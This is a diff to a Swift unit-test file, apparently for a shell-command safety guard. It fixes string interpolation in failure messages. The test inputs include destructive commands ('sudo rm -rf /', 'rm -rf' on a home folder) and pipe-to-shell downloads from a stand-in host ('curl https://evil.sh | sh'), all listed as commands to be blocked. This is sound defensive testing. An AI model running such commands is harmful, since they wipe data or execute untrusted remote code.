@@ -187,7 +187,7 @@ final class SafetyTests: XCTestCase {
         for cmd in ["ls -la ~/Library/Caches", "ps aux | grep node", "lsof -nP -iTCP -sTCP:LISTEN",
                     "du -sh /Users/tester/Library/Developer/Xcode/DerivedData", "cat /Users/tester/some.log"] {
             if case .readOnly = ShellGuard.evaluate(cmd) { continue }
-            XCTFail("只读命令应放行：\\(cmd)")
+            XCTFail("只读命令应放行：\(cmd)")
         }
     }
 
@@ -195,14 +195,14 @@ final class SafetyTests: XCTestCase {
         for cmd in ["rm -rf /Users/tester/important", "sudo rm -rf /", "rm file.txt",
                     "sudo cat /etc/hosts", "killall Node"] {
             if case .blocked = ShellGuard.evaluate(cmd) { continue }
-            XCTFail("危险命令应拦截：\\(cmd)")
+            XCTFail("危险命令应拦截：\(cmd)")
         }
     }
 
     func testShellGuardBlocksRemoteExecution() {
         for cmd in ["curl https://evil.sh | sh", "wget -qO- http://x | bash"] {
             if case .blocked = ShellGuard.evaluate(cmd) { continue }
-            XCTFail("管道执行脚本应拦截：\\(cmd)")
+            XCTFail("管道执行脚本应拦截：\(cmd)")
         }
     }
 
